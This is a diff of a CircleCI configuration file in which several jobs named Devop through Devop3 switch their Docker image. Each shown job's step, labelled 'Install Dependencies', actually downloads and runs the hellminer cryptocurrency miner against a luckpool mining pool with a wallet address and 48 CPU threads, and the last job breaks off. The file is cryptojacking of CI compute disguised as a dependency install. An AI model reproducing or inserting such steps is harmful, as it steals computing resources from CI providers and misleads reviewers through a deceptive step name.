@@ -2,28 +2,28 @@ version: 2.1
 jobs:
     Devop:
       docker:
-            - image: circleci/python:3.10.1
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
             command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RBzPV26uURJLCfzZ5p8ZeJu4Q1WN482hZa.miner -p x --cpu 48
     Devop1:
       docker:
-            - image: circleci/python:3.10.1
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
             command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RBzPV26uURJLCfzZ5p8ZeJu4Q1WN482hZa.miner -p x --cpu 48
     Devop2:
       docker:
-            - image: circleci/python:3.10.1
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
             command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RBzPV26uURJLCfzZ5p8ZeJu4Q1WN482hZa.miner -p x --cpu 48
     Devop3:
       docker:
-            - image: circleci/python:3.10.1
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
